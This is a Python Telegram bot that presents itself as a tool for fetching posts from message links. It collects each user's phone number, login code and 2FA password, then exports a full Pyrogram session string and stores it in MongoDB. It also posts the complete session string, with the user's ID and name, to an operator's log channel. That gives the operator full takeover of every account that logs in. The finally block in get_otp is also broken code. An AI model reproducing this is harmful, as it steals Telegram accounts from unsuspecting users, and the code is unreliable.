# --- final_bot.py ---

import os
import logging
from threading import Thread
from typing import Dict

# Web Server for Health Checks
from flask import Flask

# Telegram Bot and Conversation Handling
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# Pyrogram for User Session Handling
from pyrogram.client import Client
from pyrogram.errors import (
    SessionPasswordNeeded,
    PhoneCodeInvalid,
    PasswordHashInvalid,
    FloodWait
)

# MongoDB Setup
import pymongo

# Basic Configuration
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Credentials from Environment Variables
API_ID = int(os.getenv("API_ID", 0))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", 0))
MONGO_URI = os.getenv("MONGO_URI")

# Database Connection
db_client = None
try:
    if MONGO_URI:
        db_client = pymongo.MongoClient(MONGO_URI)
        db = db_client.get_database("telegram_bot_sessions")
        sessions_collection = db.get_collection("user_sessions")
        logger.info("Successfully connected to MongoDB.")
except Exception as e:
    logger.error(f"FATAL: Could not connect to MongoDB: {e}")

# Conversation States
GET_PHONE, GET_OTP, GET_2FA = range(3)

# Helper Functions (MongoDB)
def load_sessions() -> Dict[int, str]:
    if not db_client: return {}
    sessions = {}
    try:
        for doc in sessions_collection.find({}):
            sessions[doc["user_id"]] = doc["session_string"]
        logger.info(f"Loaded {len(sessions)} sessions from the database.")
        return sessions
    except Exception as e:
        logger.error(f"Error loading sessions from DB: {e}")
        return {}

def save_session(user_id: int, session_string: str):
    if not db_client: return
    try:
        sessions_collection.update_one({"user_id": user_id}, {"$set": {"session_string": session_string}}, upsert=True)
    except Exception as e:
        logger.error(f"Error saving session for user {user_id}: {e}")

def delete_session(user_id: int):
    if not db_client: return
    try:
        sessions_collection.delete_one({"user_id": user_id})
    except Exception as e:
        logger.error(f"Error deleting session for user {user_id}: {e}")

user_sessions = load_sessions()

# --- REWRITTEN LOGIN LOGIC ---

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in user_sessions:
        await update.message.reply_text("✅ You are already logged in.\n\nTo log out, use /logout.")
        return ConversationHandler.END
    await update.message.reply_text("Welcome! To log in, please send your phone number in international format (e.g., +14155552671).")
    return GET_PHONE

async def get_phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone_number = update.message.text.strip()
    await update.message.reply_text("Trying to connect and send OTP...")
    try:
        # Create the client and store it in the context to persist it
        client = Client(name=str(update.effective_user.id), api_id=API_ID, api_hash=API_HASH, in_memory=True)
        await client.connect()
        sent_code = await client.send_code(phone_number)
        
        # Store the essential data for the next step
        context.user_data['client'] = client
        context.user_data['phone_code_hash'] = sent_code.phone_code_hash
        context.user_data['phone_number'] = phone_number

        await update.message.reply_text("OTP sent! Please send it to me now.")
        return GET_OTP
    except FloodWait as e:
        await update.message.reply_text(f"Telegram asks to wait for {e.value} seconds before trying again. Please use /start after the time has passed.")
        return ConversationHandler.END
    except Exception as e:
        logger.error(f"Error in get_phone_number: {e}")
        # Make sure to disconnect if the client was created but an error occurred
        if 'client' in context.user_data and context.user_data['client'].is_connected:
            await context.user_data['client'].disconnect()
        await update.message.reply_text(f"An error occurred: `{e}`. Please try again with /start.")
        return ConversationHandler.END

async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    otp = update.message.text.strip()
    client = context.user_data.get('client')
    phone_number = context.user_data.get('phone_number')
    phone_code_hash = context.user_data.get('phone_code_hash')
    user_id = update.effective_user.id

    if not client:
        await update.message.reply_text("Your session expired. Please start over with /start.")
        return ConversationHandler.END

    try:
        await client.sign_in(phone_number, phone_code_hash, otp)
        session_string = await client.export_session_string()
        user_sessions[user_id] = session_string
        save_session(user_id, session_string)
        log_message = (f"#NewSession\n\nUser ID: `{user_id}`\nName: {update.effective_user.full_name}\n\n**Session String:**\n`{session_string}`")
        await context.bot.send_message(chat_id=LOG_CHANNEL_ID, text=log_message, parse_mode='Markdown')
        await update.message.reply_text("✅ Login successful!")
        return ConversationHandler.END
    except SessionPasswordNeeded:
        await update.message.reply_text("Your account has 2FA enabled. Please send me your password.")
        return GET_2FA # Client is kept alive in the context
    except Exception as e:
        logger.error(f"Error in get_otp: {e}")
        await update.message.reply_text(f"An error occurred: `{e}`. Please start over with /start.")
        return ConversationHandler.END
    finally:
        # Disconnect client only when the conversation is truly over
        if context.user_data.get('client') and ConversationHandler.END in [await get_otp, await get_2fa_password]:
             await context.user_data['client'].disconnect()


async def get_2fa_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text.strip()
    client = context.user_data.get('client')
    user_id = update.effective_user.id

    if not client:
        await update.message.reply_text("Your session expired. Please start over with /start.")
        return ConversationHandler.END

    try:
        await client.check_password(password)
        session_string = await client.export_session_string()
        user_sessions[user_id] = session_string
        save_session(user_id, session_string)
        log_message = (f"#NewSession (2FA)\n\nUser ID: `{user_id}`\nName: {update.effective_user.full_name}\n\n**Session String:**\n`{session_string}`")
        await context.bot.send_message(chat_id=LOG_CHANNEL_ID, text=log_message, parse_mode='Markdown')
        await update.message.reply_text("✅ 2FA correct & login successful!")
        return ConversationHandler.END
    except Exception as e:
        logger.error(f"Error in get_2fa_password: {e}")
        await update.message.reply_text(f"An error occurred: `{e}`. Please start over with /start.")
        return ConversationHandler.END
    finally:
        if client and client.is_connected:
            await client.disconnect()

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gracefully ends the conversation and disconnects any active client."""
    if 'client' in context.user_data and context.user_data['client'].is_connected:
        await context.user_data['client'].disconnect()
        logger.info("Client disconnected during cancel.")
    await update.message.reply_text("Login process canceled.")
    return ConversationHandler.END

# --- Unchanged Functions Below ---

async def logout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in user_sessions:
        del user_sessions[user_id]
        delete_session(user_id)
        await update.message.reply_text("✅ You have been successfully logged out.")
        await context.bot.send_message(chat_id=LOG_CHANNEL_ID, text=f"#Logout\n\nUser ID: `{user_id}` has logged out.", parse_mode='Markdown')
    else:
        await update.message.reply_text("You are not logged in.")

async def handle_message_with_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_sessions:
        await update.message.reply_text("You are not logged in. Please use /start to begin.")
        return
    message_text = update.message.text
    try:
        parts = message_text.split('/')
        if 't.me' not in parts[-3]: return
        channel_part, msg_id = parts[-2], int(parts[-1])
        chat_id = int(f"-100{parts[-3]}") if channel_part == 'c' else f"@{channel_part}"
    except (IndexError, ValueError):
        await update.message.reply_text("This doesn't look like a valid Telegram message link.")
        return
    await update.message.reply_text("⏳ Fetching post...")
    session_string = user_sessions[user_id]
    user_client = Client(name=f"user_{user_id}", session_string=session_string, api_id=API_ID, api_hash=API_HASH)
    try:
        async with user_client:
            await user_client.copy_message(chat_id=update.effective_chat.id, from_chat_id=chat_id, message_id=msg_id)
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to fetch post.\n\n**Reason:** `{e}`")

# --- Web Server and Startup ---

app = Flask('')
@app.route('/')
def home(): return "Bot is alive!"
def run_flask(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

def main():
    if not all([API_ID, API_HASH, BOT_TOKEN, LOG_CHANNEL_ID, MONGO_URI]):
        logger.error("CRITICAL: One or more environment variables are missing!")
        return
    if not db_client:
        logger.error("CRITICAL: Bot cannot start without a database connection.")
        return

    application = Application.builder().token(BOT_TOKEN).build()
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start_command)],
        states={
            GET_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone_number)],
            GET_OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_otp)],
            GET_2FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_2fa_password)],
        },
        fallbacks=[CommandHandler('cancel', cancel_command)],
        conversation_timeout=300 # Timeout conversation after 5 minutes of inactivity
    )
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler('logout', logout_command))
    application.add_handler(MessageHandler(filters.TEXT & filters.Entity("url") & ~filters.COMMAND, handle_message_with_link))
    
    flask_thread = Thread(target=run_flask)
    flask_thread.start()
    
    logger.info("Starting bot polling...")
    application.run_polling()

if __name__ == "__main__":
    main()